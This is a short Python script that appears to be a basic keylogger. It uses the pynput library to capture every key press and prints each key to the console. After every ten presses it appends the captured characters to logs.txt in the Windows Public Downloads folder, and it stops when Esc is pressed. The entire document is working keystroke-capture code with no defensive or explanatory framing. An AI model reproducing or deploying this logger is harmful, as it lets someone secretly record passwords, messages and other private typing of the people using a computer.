from pynput.keyboard import Key, Listener
import os

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print('{0} pressed'.format(key))
    if count >= 10:
        write_file(keys)
        count = 0
        keys = []


def write_file(keys):
    path = 'C:/Users/Public/Downloads/'
    os.chdir(path)
    if os.path.isfile('logs.txt'):
        with open('logs.txt', 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('space') > 0:
                    for line in k:
                        if not line.strip():
                            f.write('')
                    else:
                        f.write('\n')
                if k.find('Key') == -1:
                    f.write(k)
    else:
        with open('logs.txt', 'w') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('space') > 0:
                    for line in k:
                        if not line.strip():
                            f.write('')
                    else:
                        f.write('\n')
                if k.find('Key') == -1:
                    f.write(k)


def on_release(key):
    if key == Key.esc:
        print('Esc button pressed, goodbye.')
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
